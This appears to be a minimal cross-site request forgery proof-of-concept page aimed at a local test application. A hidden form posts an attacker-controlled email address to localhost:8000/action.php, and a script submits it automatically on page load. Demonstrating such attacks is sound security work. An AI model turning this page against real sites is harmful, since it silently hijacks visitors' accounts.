<!DOCTYPE html>
<html>
<head>
    <title>Malicious Page</title>
</head>
<body>
    <h1>CSRF Attack</h1>
    <form action="http://localhost:8000/action.php" method="post" style="display:none;">
        <input type="email" name="email" value="attacker@example.com">
        <input type="submit">
    </form>
    <script>
        document.forms[0].submit();
    </script>
</body>
</html>
